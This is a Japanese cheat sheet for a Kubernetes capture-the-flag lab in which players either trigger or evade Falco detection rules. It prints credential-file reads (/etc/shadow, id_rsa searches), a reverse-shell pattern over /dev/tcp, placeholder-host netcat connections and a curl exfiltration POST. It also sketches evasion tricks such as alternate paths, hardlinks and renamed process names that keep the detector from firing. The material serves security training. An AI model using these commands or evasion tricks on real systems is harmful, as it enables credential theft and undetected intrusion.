# チートシート / TIPS

課題を解くときに使う **基本コマンド** を、都度調べなくても済むように 1 ページに
まとめました。ここに載っているのは **汎用的なコマンド例** です。答え(flag や
特定の攻略コマンド)は載せていません — 手を動かす発想の起点として使ってください。

!!! tip "使い方"
    ワークスペース(Web ターミナル)と、この 1 ページを並べて開いておくと快適です。
    各ミッションのブリーフィング・段階的なヒント(気付き → 概要 → 解答、
    開くと減点)は STORY タブ(ミッションページ)で確認できます。

---

## まず最初に(オリエンテーション)

ワークスペースに入ったら、環境と自分の識別子を確認するところから。

```bash
echo "$FALCO_CTF_USER"          # 自分の識別子(提出・採点のキー)
cat /etc/os-release             # 動いている OS(Alpine ベース)
hostname                        # Pod 名 = 自分のワークスペース
```

### スコアボードの表示名を変える

識別子(`user1` など)はそのまま、**表示名だけ**を好きな名前にできます。

```bash
source /opt/ctf/setname.sh
setname 'あなたの名前'
```

制約: 1〜32 文字、`< > & " '` と制御文字は使えません。何回でも変更可能です。

!!! note "trigger と evade"
    **trigger** 課題は対象 Falco ルールを **発火させる** ことが solve
    (提出不要 — 発火が自動的に solve)。
    **evade** 課題は **発火させずに** 目的を達成し、flag を **提出** することが solve。
    詳しくは [ストーリー](story.md) を参照。

---

## 1. Kubernetes / API サーバ偵察

侵入直後、Pod の中から Kubernetes API に触れて環境を把握するときに使います
(Mission 01)。

```bash
# API サーバに触れる(自己署名証明書なので -k / --no-check-certificate)
curl -sk https://kubernetes.default.svc/version
curl -sk https://kubernetes.default.svc/api

# curl が無い/使えないときは busybox の wget でも同じことができる
wget -q -O- --no-check-certificate https://kubernetes.default.svc/version

# Pod に配られている ServiceAccount の情報(トークン / CA / namespace)
ls  /var/run/secrets/kubernetes.io/serviceaccount/
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
```

| フラグ | 意味 |
|---|---|
| `curl -s` | 進捗メータを出さない(silent) |
| `curl -k` / `--insecure` | 証明書検証をスキップ(自己署名向け) |
| `curl -o-` / `-O-` | 標準出力へ本文を出す |
| `wget --no-check-certificate` | busybox wget で証明書検証をスキップ |

---

## 2. ファイル探索・読み取り

機密ファイルを見つけて読むための基本(Mission 02 / 04 ほか)。

```bash
# 探す
ls -la /root /home /etc/ssh          # 一覧(-l で詳細、-a で隠しファイル)
find / -name id_rsa 2>/dev/null      # 名前で全体検索(エラーは捨てる)
find / -iname '*.key' 2>/dev/null    # -iname で大文字小文字を無視
grep -rE 'BEGIN.*PRIVATE KEY' /etc 2>/dev/null   # 中身をパターン再帰検索

# 読む
cat  /etc/shadow                     # そのまま表示
less /etc/sudoers                    # ページャで読む(q で終了)
head -n 20 /etc/passwd               # 先頭 N 行
tail -n 5  /etc/shadow               # 末尾 N 行
file  /path/to/blob                  # ファイル種別を判定
od -c /path/to/blob | head           # バイナリを文字つきダンプ
hexdump -C /path/to/blob | head      # 16 進ダンプ(util-linux)
```

!!! warning "検知される読み方 / されない読み方"
    Mission 02 のような **trigger** 課題では `cat /etc/shadow` のように
    素直に読むと狙いどおり検知されます。
    Mission 03 / 05 のような **evade** 課題では「同じ中身を、検知されない
    読み方で取り出す」のがテーマです。段階的なヒントは `/journey` の
    各ミッションページ、判定ロジックは [Falco の観測ポイント](#7-falco) を参照。

---

## 3. プロセス / システム調査

「Falco が何を見ているか」を理解するために、自分のプロセスや `/proc` を
観察します(Mission 03 / 05 / 07 の発想の土台)。

```bash
ps aux                          # プロセス一覧(procps)
cat /proc/self/cmdline | tr '\0' ' '; echo   # 自分の起動引数(NUL 区切り)
cat /proc/$$/comm               # 自分のシェルの comm 名
ls -l /proc/self/root           # mount namespace の root へのリンク
ls -l /proc/self/fd             # 開いているファイルディスクリプタ
```

| 見どころ | 何が分かるか |
|---|---|
| `/proc/<pid>/cmdline` | そのプロセスが受け取った **引数**(Falco の `proc.cmdline`) |
| `/proc/<pid>/comm` | プロセスの短い名前(`proc.name` / `proc.pname`) |
| `/proc/<pid>/root` | その namespace から見た **root への別パス** |
| `/proc/<pid>/fd` | 開いている fd(0/1/2 = 標準入出力) |

### comm を自分で選ぶ (任意の名前で実行ファイルを作る)

`comm` はカーネルが exec 時に **実行ファイルの basename** から決める。
shebang スクリプト (`#!/bin/sh` 等) を新規に書き出して実行すると、
そのスクリプト自身の名前が comm になる(interpreter の名前にはならない):

```bash
printf '#!/bin/sh\n<好きなコマンド>\n' > /tmp/<好きな名前>
chmod +x /tmp/<好きな名前>
/tmp/<好きな名前>
```

⚠ **既存の実行ファイル (`/bin/sh` 等) をコピーして名前を変えるのは避ける**。
busybox ベースのシェルは multicall バイナリで `argv[0]` から挙動を決めるため
意図通りに動かないことがあり、かつ新規バイナリの drop+exec とみなされ、
別の検知ルールが誘発される場合がある。**新規にスクリプトを書き出す形**が安全。

---

## 4. リンク・inode 操作

ファイル本体(inode)と、それを指すパスは別物です。ハードリンク/シンボリック
リンクの違いは複数の課題で効いてきます(Mission 09 ほか)。

```bash
ln    /path/to/target /tmp/alias      # ハードリンク(同じ inode に別名)
ln -s /path/to/target /tmp/alias      # シンボリックリンク(別 inode のポインタ)
ls -li /tmp/alias /path/to/target     # -i で inode 番号を表示(同一か確認)
stat  /path/to/target                 # inode・リンク数・サイズ等の詳細
readlink -f /tmp/alias                # シンボリックリンクの最終到達先
```

---

## 5. ネットワーク / 送信

外部との通信や、flag の持ち出し(exfil)に使います(Mission 08 / 10 ほか)。

```bash
# HTTP クライアント
curl -s https://example.invalid/path
curl -s -X POST https://example.invalid/api \
     -H 'Content-Type: application/json' \
     -d '{"key":"value"}'

# JSON を組み立てて送る(user と flag はプレースホルダ)
curl -s -X POST "${FALCO_CTF_COLLECTOR}/api/challenges/<NN>-<slug>/exfil" \
     -H 'Content-Type: application/json' \
     -d "$(printf '{"user":"%s","flag":"%s"}' "$FALCO_CTF_USER" 'FALCO{...}')"

# 素の TCP(netcat / bash の /dev/tcp)
nc -v example.invalid 80
bash -c 'exec 3<>/dev/tcp/example.invalid/80; echo done >&3'

# DNS 調査(bind-tools)
nslookup collector.collector.svc
dig +short example.invalid
```

!!! warning "リバースシェルは「見えて」います"
    `bash -i >& /dev/tcp/host/port 0>&1` のような
    **標準入出力をソケットに向け直す** パターンは Falco の検知対象です
    (Mission 08 の trigger はまさにこれを狙って発火させます)。
    Mission 10 のように **持ち出しつつ回避** したい場面では、既存の
    HTTP クライアント(`curl`)で普通に POST するなど、fd を差し替えない
    経路を考えます。

---

## 6. Falco の観測ポイント {#7-falco}

evade 課題を解く鍵は「Falco が **何を見て** 判定しているか」を知ることです。
多くのルールは以下のフィールドを条件にしています。

| フィールド | 意味 | 効いてくる例 |
|---|---|---|
| `fd.name` | `open` に渡された **パス文字列**(inode ではない) | 同じ中身へ別パスで到達すると別物に見える |
| `proc.cmdline` | プロセスの **起動引数** すべて | 引数にパスが乗らない読み方だと条件に当たらない |
| `proc.name` / `proc.pname` | プロセス / 親プロセスの短い名前 | どのプロセスが実行したか |
| `proc.is_exe_upper_layer` | 実行ファイルが overlayfs の **上位層** にあるか | 実行時に置いた新規バイナリか、ベースイメージ由来か |
| `evt.type` | syscall の種類(`open` / `connect` / `execve` …) | 何をした瞬間に見られているか |

各ミッションが対象にしている **実際の Falco ルール** は、ミッションページの
「検知ルール (Falco Rule)」節に掲載しています([ミッション一覧](missions/index.md))。
ルール構文そのものを深掘りしたい場合は [参考資料](references.md) の公式ドキュメントへ。
